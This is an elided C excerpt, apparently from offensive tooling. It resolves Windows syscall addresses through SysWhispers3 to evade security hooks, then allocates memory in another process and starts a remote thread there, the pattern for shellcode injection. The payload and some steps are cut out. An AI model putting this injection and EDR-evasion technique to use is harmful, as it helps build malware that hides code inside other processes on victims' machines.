...
static bool Init()
{
	...
	if ((avmADDR = SW3_GetSyscallAddress(ZwAllocateVirtualMemoryHash)) == NULL)
		return FALSE;

	if ((wvmADDR = SW3_GetSyscallAddress(ZwWriteVirtualMemoryHash)) == NULL)
		return FALSE;

	if ((pvmADDR = SW3_GetSyscallAddress(ZwProtectVirtualMemoryHash)) == NULL)
		return FALSE;

	if ((cteADDR = SW3_GetSyscallAddress(ZwCreateThreadExHash)) == NULL)
		return FALSE;
...
int main()
{
	...
	if (NtAllocateVirtualMemory(hProcess, &pRemoteAddr, 0, &bufLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) != STATUS_SUCCESS) {
	...
	if (NtCreateThreadEx(&hRemoteThread, THREAD_ALL_ACCESS, NULL,
		hProcess, pRemoteAddr, NULL, FALSE, 0, 0, 0, NULL) != STATUS_SUCCESS) {
		print_debug("[-] NtCreateThreadEx failed\n");
		VirtualFreeEx(hProcess, pRemoteAddr, 0, MEM_RELEASE);
		goto Exit;
	};
